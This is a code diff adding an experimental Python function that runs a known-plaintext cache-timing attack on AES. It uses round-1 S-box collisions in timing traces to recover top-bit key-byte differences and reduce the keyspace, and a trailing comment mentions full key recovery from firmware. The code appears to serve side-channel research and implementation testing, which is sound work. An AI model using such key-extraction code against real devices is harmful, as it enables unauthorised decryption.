@@ -238,6 +238,66 @@ def recover_round1_diffs(plaintext, timing, *, ref=0, line_shift=4):
     return diffs
 
 
+def recover_round1_keyspace(plaintext, timing, *, line_shift=4, conf_threshold=3.0, ref=0):
+    """EXPERIMENTAL. Known-plaintext-only keyspace REDUCTION via round-1 collisions.
+
+    Recovers the top-bit key-byte *differences* topbits(k0[a]^k0[b]) for the byte
+    pairs that actually leak (selected by dip confidence), then propagates them
+    from a reference byte to assign each resolved byte's top bits relative to it.
+    This is the honest ceiling of a known-plaintext-only attack on this channel:
+    pairwise collisions carry only top-bit differences (the cache line is 16 bytes
+    -> nibble resolution for an S-box), so the low bits and one reference offset
+    remain -- a keyspace reduction, not a full key. Combine with ANY output
+    observation (the last-round attack) for the full key.
+
+    Returns a dict: reldiff (topbits(k0[j]^k0[ref]) or None if unresolved),
+    resolved count, per-pair confidence, and the residual-entropy estimate (bits).
+    """
+    pt = np.asarray(plaintext, np.int64)
+    y = np.asarray(timing, float); y = y - y.mean()
+    hp = pt >> line_shift
+    nb = 1 << (8 - line_shift)
+    top_bits = 8 - line_shift                        # bits of resolution per byte
+    edges = []                                       # (conf, a, b, diff)
+    for a in range(16):
+        for b in range(a + 1, 16):
+            v = (hp[:, a] ^ hp[:, b])
+            sums = np.zeros(nb); cnt = np.zeros(nb)
+            np.add.at(sums, v, y); np.add.at(cnt, v, 1.0)
+            means = np.where(cnt > 0, sums / np.maximum(cnt, 1), np.nan)
+            fin = means[np.isfinite(means)]
+            d = int(np.nanargmin(means))
+            dip = float(fin.mean() - means[d]); conf = dip / (fin.std() + 1e-9)
+            edges.append((conf, a, b, d))
+    edges.sort(reverse=True)
+    reldiff = [None] * 16; reldiff[ref] = 0
+    rconf = [None] * 16; rconf[ref] = float("inf")
+    changed = True
+    while changed:
+        changed = False
+        for conf, a, b, d in edges:
+            if conf < conf_threshold:
+                break
+            if reldiff[a] is not None and reldiff[b] is None:
+                reldiff[b] = reldiff[a] ^ d; rconf[b] = conf; changed = True
+            elif reldiff[b] is not None and reldiff[a] is None:
+                reldiff[a] = reldiff[b] ^ d; rconf[a] = conf; changed = True
+    resolved = sum(x is not None for x in reldiff)
+    max_edge = float(edges[0][0]) if edges else 0.0
+    # residual entropy: unresolved bytes fully unknown (8b each); resolved bytes
+    # keep their low (line_shift) bits unknown; plus the reference offset (top_bits).
+    residual = (16 - resolved) * 8 + resolved * line_shift + top_bits
+    return {"reldiff": reldiff, "reldiff_conf": rconf, "resolved": resolved,
+            "top_bits": top_bits, "max_edge_conf": max_edge,
+            "residual_entropy_bits": residual,
+            "strong_edges": [e for e in edges if e[0] >= conf_threshold][:20],
+            "note": "known-plaintext-only: top-bit key differences only; keyspace "
+                    f"reduced 128 -> ~{residual} bits IF the edges are real. Reliable on "
+                    "S-box implementations; a 4-table T-table interleaves the round-1 "
+                    "lookups so few pairs truly collide (results unreliable). Add one "
+                    "output observation (last-round attack) for the full key."}
+
+
 # --------------------------------------------------------------------------
 # Second-to-last round recovery -> full AES-192/256 master, on FULL (unmodified,
 # no round-reduction) firmware, from the SAME traces. MixColumns is linear, so we
